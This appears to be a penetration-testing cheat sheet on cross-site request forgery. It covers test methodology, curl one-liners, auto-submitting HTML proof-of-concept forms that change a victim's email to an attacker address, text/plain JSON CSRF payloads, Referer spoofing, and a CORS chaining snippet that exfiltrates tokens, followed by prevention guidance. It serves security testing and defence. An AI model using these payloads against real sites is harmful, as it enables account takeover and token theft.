# CSRF (Cross‑Site Request Forgery)

> Comprehensive methodology and one‑liner commands for testing CSRF vulnerabilities, incorporating 2025–2026 trends (SameSite Lax bypass via method override, cookie refresh attacks, JSON CSRF bypasses with text/plain, token fixation, CORS+CSRF chaining) and authoritative references (OWASP CSRF Prevention Cheat Sheet, PortSwigger Web Security Academy, PayloadsAllTheThings, recent write‑ups).

CSRF forces a victim's browser to execute unwanted actions on a web application where they are authenticated. The browser automatically includes session cookies, making the forged request appear legitimate to the server.

## Methodology

### Types of CSRF to Test

- **GET‑based CSRF** – malicious links/images triggering state‑changing GET requests
- **POST‑based CSRF** – auto‑submitting forms from attacker‑controlled pages
- **JSON CSRF** – APIs expecting JSON payloads (`application/json`)
- **Double Submit Cookie** – token present in both cookie and request parameter
- **Stateless/Token‑based** – anti‑CSRF tokens in hidden fields or headers
- **Blind CSRF** – no visible feedback (webhooks, background actions)

### Targets & Input Locations to Hunt

State‑changing actions that modify user data or application state:

**Common vulnerable endpoints:**
- `/change‑email`, `/update‑profile`, `/change‑password`
- `/delete‑account`, `/transfer‑funds`, `/add‑payment`
- `/subscribe`, `/unsubscribe`, `/follow‑user`
- `/api/delete`, `/api/update`, `/api/create`
- `/settings`, `/profile`, `/admin/*`
- `/logout`, `/enable‑2fa`, `/disable‑2fa`

Also test:
- API endpoints accepting POST/PUT/DELETE
- AJAX/Fetch requests without CORS protection
- WebSocket connections for state changes
- File upload endpoints (change avatar, upload document)
- User preference settings (theme, notifications)

### Basic Probes & Testing Methods

1. **Identify state‑changing requests** – capture authenticated requests in Burp Proxy
2. **Test without anti‑CSRF token** – remove token parameter completely or use empty value
3. **Test HTTP method manipulation** – change POST to GET, PUT to POST, DELETE to GET; try `_method` or `X‑HTTP‑Method‑Override` header
4. **Check SameSite cookie attribute** – inspect `Set‑Cookie` headers for `SameSite` value (`None`, `Lax`, `Strict`)

## Tool Installation & Setup

### XSRFProbe (CSRF detection and auditing)

```bash
pip3 install xsrfprobe
```

### OWASP CSRFTester

```bash
# Download from https://github.com/OWASP/CSRFTester
java -jar CSRFTester.jar
```

### Burp Suite Professional

- **Engagement tools → Generate CSRF PoC**
- **CSRF Scanner** (active scanning)

### Turbo Intruder (Burp extension)

- Fuzz CSRF token parameters for bypasses

## Testing Commands (One‑Liners)

### 1. CSRF Token Detection

```bash
# Search for CSRF tokens in HTML
curl -s "http://target.com/page" | grep -iE "csrf|_token|authenticity_token"
# Extract token value
curl -s "http://target.com/page" | grep -oP 'name="csrf_token" value="\K[^"]+'
```

### 2. Test for Token Validation

```bash
# Submit request without token
curl -X POST "http://target.com/api/action" -d "param=value"
# Submit with invalid token
curl -X POST "http://target.com/api/action" -d "param=value&csrf_token=invalid"
```

### 3. Quick CSRF PoC Generator

```bash
# Extract form action URL
curl -s "http://target.com/page" | grep -oP 'action="\K[^"]+'
# Create HTML PoC
cat > csrf-poc.html << 'EOF'
<html>
  <body>
    <form action="https://target.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.forms[0].submit()</script>
  </body>
</html>
EOF
```

### 4. Bypass Techniques

```bash
# GET‑based CSRF (state‑changing GET)
curl "http://target.com/action?email=attacker@evil.com"
# JSONP‑style callback injection
curl -X GET "http://target.com/api?callback=evil&email=attacker@evil.com"
```

### 5. SameSite Cookie Bypass via Method Override

```bash
# Use _method parameter to convert GET to POST (bypasses SameSite=Lax)
curl "https://target.com/settings?_method=POST&email=attacker@evil.com"
```

### 6. JSON CSRF Bypass with text/plain Content‑Type

```bash
# Craft form with enctype="text/plain"
cat > json-csrf.html << 'EOF'
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
EOF
```

### 7. XSRFProbe Automated Scanning

```bash
# Scan a single endpoint
xsrfprobe -u https://target.com/endpoint --cookie "session=abc123"
# Crawl and test all forms
xsrfprobe -u https://target.com --crawl --cookie "session=abc123" --output results.txt
```

### 8. Test Referer/Origin Validation

```bash
# Send request with missing Referer header
curl -X POST "https://target.com/action" -d "param=value" -H "Referer:"
# Spoof Referer as subdomain
curl -X POST "https://target.com/action" -d "param=value" -H "Referer: https://target.com.attacker.com"
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

### SameSite Cookie Bypass

- **Method Override** – `_method=POST` parameter converts GET to POST (bypasses SameSite=Lax)
- **Cookie Refresh** – OAuth login flow can refresh session cookies cross‑site
- **Subdomain XSS** – XSS on `app.target.com` can bypass SameSite=Strict on `target.com`

### JSON CSRF Bypass

- **text/plain Content‑Type** – send JSON using form with `enctype="text/plain"`
- **Content‑Type confusion** – `Content‑Type: text/plain; charset=utf‑7`
- **JSON as query parameter** – move data to URL parameters

### Token Bypass

- **Session Fixation** – set victim's CSRF cookie to known value
- **Token Reuse** – use valid token from another user (token not tied to session)
- **Token Prediction** – short/sequential tokens, tokens starting with predictable patterns
- **Hardcoded Token** – same token works for all users

### Header Bypass

- **Referer Manipulation** – if checked as substring: `target.com.attacker.com`
- **Origin Header** – server may reflect arbitrary Origin values
- **Remove Referer** – `<meta name="referrer" content="no‑referrer">`

### CORS + CSRF Chaining

- If `Access‑Control‑Allow‑Credentials: true` with wildcard or vulnerable origin:
  ```javascript
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://target.com/api/token', true);
  xhr.withCredentials = true;
  xhr.onload = function() { exfiltrate(xhr.responseText); };
  xhr.send();
  ```
- Extract CSRF token from response, then perform CSRF attack

### XSS + CSRF Chaining

- Use XSS to bypass SameSite=Strict cookies
- Extract token via XSS and make authenticated CSRF request

## Detection & Verification

**Successful exploitation indicators:**

- Action performed (email changed, account deleted, funds transferred)
- No user interaction/confirmation required
- Request processed with victim's session cookies

**Verification steps:**

1. Capture baseline request with valid session
2. Remove/modify CSRF token
3. Submit from different origin (or using curl from external server)
4. Check if action was executed
5. Verify actual data change in application

**Blind CSRF:**

- Use out‑of‑band techniques (DNS, HTTP callbacks) to confirm request execution
- Monitor for side‑effects (email notifications, webhook callbacks)

## Prevention Guidance (OWASP 2025+)

1. **Synchronizer Token Pattern (recommended)**
   - Generate unique, unpredictable CSRF token per session
   - Include in all state‑changing requests (POST, PUT, DELETE)
   - Validate server‑side, reject requests without valid token

2. **SameSite Cookies**
   - `SameSite=Strict` – blocks all cross‑site requests (best for sensitive actions)
   - `SameSite=Lax` – allows safe top‑level navigations, blocks POST forms
   - `SameSite=None` – only if using CSRF tokens (required for cross‑site APIs)

3. **Double Submit Cookie**
   - Send token in both cookie and request parameter
   - Compare values server‑side
   - Better than nothing, but token tied to session is stronger

4. **Custom Headers**
   - Require custom header (e.g., `X‑CSRF‑Token`)
   - Browsers block cross‑origin requests with custom headers (CORS preflight)

5. **Origin/Referer Validation**
   - Check `Origin` header matches expected domain
   - Use as additional layer, not sole protection

6. **Challenge‑Response**
   - Re‑authentication for sensitive actions
   - CAPTCHA for important forms

7. **Defense in Depth** – combine multiple mitigations

## References

- **PortSwigger CSRF Cheat Sheet** – [PortSwigger Web Security Academy](https://portswigger.net/web‑security/csrf)
- **OWASP CSRF Prevention Cheat Sheet** – [OWASP Documentation](https://cheatsheetseries.owasp.org/cheatsheets/Cross‑Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- **PayloadsAllTheThings – CSRF** – [GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
- **2025–2026 Write‑ups** – SameSite Lax bypass via method override, cookie refresh attacks, JSON CSRF with text/plain, Intigriti/YesWeHack trends
